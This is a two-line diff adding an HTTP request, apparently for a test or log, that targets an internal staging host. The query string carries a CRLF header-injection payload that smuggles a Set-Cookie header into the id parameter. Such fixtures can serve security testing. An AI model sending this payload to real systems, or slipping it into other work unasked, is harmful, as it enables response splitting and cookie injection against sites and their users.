@@ -1,0 +1,2 @@
+> GET /item?id=%0d%0aSet-Cookie:zz_crlf=1 HTTP/1.1
+> Host: staging.internal.tsmss.local
